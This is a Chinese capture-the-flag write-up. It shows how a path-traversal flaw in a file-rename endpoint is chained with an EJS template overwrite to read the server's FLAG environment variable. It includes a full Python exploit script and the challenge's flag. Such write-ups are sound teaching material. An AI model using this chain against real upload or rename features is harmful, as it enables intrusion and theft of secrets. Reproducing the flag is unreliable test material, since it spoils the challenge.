# Level 47 BandBomb

## 题目简述

题目提供了一个乐队主页和文件上传功能。提示中特别指出首页模板已由 `index.ejs` 改名为 `mortis.ejs`，这意味着服务端会直接渲染该文件。目标是组合文件上传与重命名接口，覆盖正在使用的 EJS 模板，并读取进程环境变量中的 flag。

## 解题过程

先观察应用提供的两个关键接口：

- `POST /upload`：上传文件；
- `POST /rename`：接收 `oldName` 和 `newName`，重命名已经上传的文件。

上传接口本身只把文件放进上传目录，但重命名接口没有把目标路径限制在该目录内，因此 `newName` 可以包含 `../`。这形成了目录穿越写文件：先上传任意内容，再把上传文件移动到应用的模板目录。

EJS 中的表达式 `<%= ... %>` 会在模板渲染时求值。题目把 flag 放在 Node.js 进程的环境变量 `FLAG` 中，所以可以准备如下模板：

```ejs
<%= process.env.FLAG %>
```

将其作为 `mortis.ejs` 上传，再通过重命名接口把文件移动到 `../views/mortis.ejs`，即可覆盖首页实际渲染的模板。最后重新访问首页，服务端会把 `process.env.FLAG` 的值写入响应。

下面的脚本完整复现了这条利用链；其中 `BASE_URL` 需要替换为题目地址：

```python
import requests

BASE_URL = "http://challenge.example"

session = requests.Session()

upload = session.post(
    f"{BASE_URL}/upload",
    files={
        "file": (
            "mortis.ejs",
            b"<%= process.env.FLAG %>",
            "application/octet-stream",
        )
    },
)
upload.raise_for_status()

rename = session.post(
    f"{BASE_URL}/rename",
    json={
        "oldName": "mortis.ejs",
        "newName": "../views/mortis.ejs",
    },
)
rename.raise_for_status()

home = session.get(f"{BASE_URL}/")
home.raise_for_status()
print(home.text)
```

PDF 中记录的最终结果为：

```text
hgame{4VE_mUJ1C@_Ha5_bR0Ken_Up_6uT_we_h@ve-UMItAKI3e}
```

## 方法总结

本题的关键不是单独的文件上传，而是两个看似普通功能的组合：上传接口提供可控内容，重命名接口通过目录穿越提供可控落点。定位到 EJS 模板目录后，用服务端模板表达式读取环境变量即可完成利用。审计类似功能时，应同时检查上传后的文件名、重命名目标路径以及文件最终是否会进入模板、配置或可执行目录。
